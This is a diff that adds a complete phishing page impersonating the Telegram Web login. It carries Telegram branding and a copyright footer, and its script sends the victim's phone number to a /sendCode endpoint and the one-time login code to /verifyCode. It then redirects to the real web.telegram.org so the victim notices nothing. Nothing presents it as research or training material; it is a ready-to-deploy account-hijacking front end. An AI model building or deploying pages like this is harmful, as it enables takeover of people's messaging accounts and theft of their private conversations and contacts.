@@ -1,0 +1,256 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Telegram Web</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: linear-gradient(135deg, #1c92d2, #f2fcfe);
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            min-height: 100vh;
+        }
+        .container {
+            background: white;
+            border-radius: 20px;
+            padding: 40px;
+            box-shadow: 0 20px 50px rgba(0,0,0,0.3);
+            width: 420px;
+            max-width: 90%;
+        }
+        .logo { text-align: center; margin-bottom: 25px; }
+        .logo .icon {
+            width: 80px; height: 80px;
+            background: #0088cc; border-radius: 50%;
+            display: flex; align-items: center; justify-content: center;
+            margin: 0 auto; font-size: 40px; color: white;
+        }
+        .logo h1 { color: #0088cc; margin-top: 10px; font-size: 22px; }
+        .logo p { color: #666; font-size: 13px; margin-top: 5px; }
+        .input-group { margin-bottom: 18px; }
+        .input-group label { display: block; color: #333; font-weight: bold; margin-bottom: 6px; font-size: 14px; }
+        .input-group input {
+            width: 100%; padding: 14px;
+            border: 2px solid #ddd; border-radius: 10px;
+            font-size: 16px; outline: none; transition: 0.3s;
+        }
+        .input-group input:focus { border-color: #0088cc; }
+        .country-row { display: flex; gap: 8px; }
+        .country-row select {
+            padding: 14px; border: 2px solid #ddd;
+            border-radius: 10px; font-size: 14px;
+            background: white; outline: none;
+        }
+        .country-row input { flex: 1; }
+        button {
+            width: 100%; padding: 14px;
+            background: #0088cc; color: white;
+            border: none; border-radius: 10px;
+            font-size: 17px; font-weight: bold;
+            cursor: pointer; transition: 0.3s;
+        }
+        button:hover { background: #006699; }
+        button:disabled { background: #ccc; cursor: not-allowed; }
+        .msg { text-align: center; margin-top: 12px; font-size: 13px; display: none; }
+        .msg.error { color: #ff3333; display: block; }
+        .msg.info { color: #0088cc; display: block; }
+        .msg.success { color: #4CAF50; display: block; }
+        .loader {
+            display: none; width: 24px; height: 24px;
+            border: 3px solid #0088cc; border-top: 3px solid transparent;
+            border-radius: 50%; margin: 10px auto;
+            animation: spin 0.8s linear infinite;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .footer { text-align: center; margin-top: 18px; color: #999; font-size: 11px; }
+        .resend { text-align: center; margin-top: 8px; font-size: 12px; color: #0088cc; cursor: pointer; display: none; }
+        #step2Form { display: none; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <div class="icon">✈️</div>
+            <h1>Telegram Web</h1>
+            <p id="statusText">Please enter your phone number</p>
+        </div>
+
+        <form id="step1Form">
+            <div class="input-group">
+                <label>Phone Number</label>
+                <div class="country-row">
+                    <select id="countryCode">
+                        <option value="+62">🇮🇩 +62</option>
+                        <option value="+60">🇲🇾 +60</option>
+                        <option value="+65">🇸🇬 +65</option>
+                        <option value="+1">🇺🇸 +1</option>
+                        <option value="+44">🇬🇧 +44</option>
+                        <option value="+91">🇮🇳 +91</option>
+                        <option value="+81">🇯🇵 +81</option>
+                        <option value="+86">🇨🇳 +86</option>
+                    </select>
+                    <input type="text" id="phoneNumber" placeholder="81234567890" maxlength="15" required>
+                </div>
+            </div>
+            <button type="submit" id="btnNext">Next</button>
+            <div class="loader" id="loader1"></div>
+            <div class="msg" id="msg1"></div>
+        </form>
+
+        <form id="step2Form">
+            <div class="input-group">
+                <label>Verification Code</label>
+                <input type="text" id="otpCode" placeholder="Enter 5-digit code" maxlength="5" required>
+                <p style="font-size:11px;color:#888;margin-top:5px;">We've sent a code to your Telegram app</p>
+            </div>
+            <button type="submit" id="btnVerify">Verify & Sign In</button>
+            <div class="loader" id="loader2"></div>
+            <div class="msg" id="msg2"></div>
+            <div class="resend" id="resendLink">↻ Resend code</div>
+        </form>
+
+        <div class="footer">© Telegram Messenger LLP</div>
+    </div>
+
+    <script>
+        let sessionId = "", phoneCodeHash = "", currentPhone = "";
+
+        const step1Form = document.getElementById('step1Form');
+        const step2Form = document.getElementById('step2Form');
+        const statusText = document.getElementById('statusText');
+        const msg1 = document.getElementById('msg1');
+        const msg2 = document.getElementById('msg2');
+        const loader1 = document.getElementById('loader1');
+        const loader2 = document.getElementById('loader2');
+        const btnNext = document.getElementById('btnNext');
+        const btnVerify = document.getElementById('btnVerify');
+        const resendLink = document.getElementById('resendLink');
+
+        step1Form.addEventListener('submit', async (e) => {
+            e.preventDefault();
+            
+            const code = document.getElementById('countryCode').value;
+            const number = document.getElementById('phoneNumber').value.replace(/\D/g, '');
+            
+            if(number.length < 6) {
+                msg1.className = 'msg error';
+                msg1.textContent = '⚠️ Invalid phone number';
+                return;
+            }
+            
+            currentPhone = code + number;
+            btnNext.disabled = true;
+            loader1.style.display = 'block';
+            msg1.className = 'msg info';
+            msg1.textContent = '📨 Sending verification code...';
+
+            try {
+                const res = await fetch('/sendCode', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ phone: currentPhone })
+                });
+                
+                const data = await res.json();
+                
+                if(data.success) {
+                    sessionId = data.sessionId;
+                    phoneCodeHash = data.phoneCodeHash;
+                    
+                    msg1.className = 'msg success';
+                    msg1.textContent = '✅ Code sent to your Telegram app!';
+                    
+                    setTimeout(() => {
+                        step1Form.style.display = 'none';
+                        step2Form.style.display = 'block';
+                        statusText.textContent = 'Enter verification code';
+                        document.getElementById('otpCode').focus();
+                        setTimeout(() => { resendLink.style.display = 'block'; }, 5000);
+                    }, 1500);
+                } else {
+                    msg1.className = 'msg error';
+                    msg1.textContent = '❌ ' + data.error;
+                }
+            } catch(err) {
+                msg1.className = 'msg error';
+                msg1.textContent = '❌ Connection error';
+            }
+            
+            loader1.style.display = 'none';
+            btnNext.disabled = false;
+        });
+
+        step2Form.addEventListener('submit', async (e) => {
+            e.preventDefault();
+            
+            const code = document.getElementById('otpCode').value.trim();
+            if(code.length < 3) {
+                msg2.className = 'msg error';
+                msg2.textContent = '⚠️ Invalid code';
+                return;
+            }
+            
+            btnVerify.disabled = true;
+            loader2.style.display = 'block';
+            msg2.className = 'msg info';
+            msg2.textContent = '🔐 Verifying...';
+
+            try {
+                const res = await fetch('/verifyCode', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ sessionId, code, phone: currentPhone })
+                });
+                
+                const data = await res.json();
+                
+                if(data.success) {
+                    msg2.className = 'msg success';
+                    msg2.textContent = '✅ Success! Redirecting...';
+                    setTimeout(() => window.location.href = 'https://web.telegram.org/', 2000);
+                } else {
+                    msg2.className = 'msg error';
+                    msg2.textContent = '❌ Invalid code. Try again.';
+                }
+            } catch(err) {
+                msg2.className = 'msg error';
+                msg2.textContent = '❌ Error verifying';
+            }
+            
+            loader2.style.display = 'none';
+            btnVerify.disabled = false;
+        });
+
+        resendLink.addEventListener('click', async () => {
+            resendLink.style.display = 'none';
+            loader2.style.display = 'block';
+            
+            try {
+                const res = await fetch('/resendCode', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ sessionId, phone: currentPhone })
+                });
+                const data = await res.json();
+                
+                if(data.success) {
+                    phoneCodeHash = data.phoneCodeHash;
+                    msg2.className = 'msg success';
+                    msg2.textContent = '✅ New code sent!';
+                }
+            } catch(err) {
+                msg2.className = 'msg error';
+                msg2.textContent = '❌ Failed to resend';
+            }
+            
+            loader2.style.display = 'none';
+            setTimeout(() => { resendLink.style.display = 'block'; }, 5000);
+        });
+    </script>
+</body>
+</html>
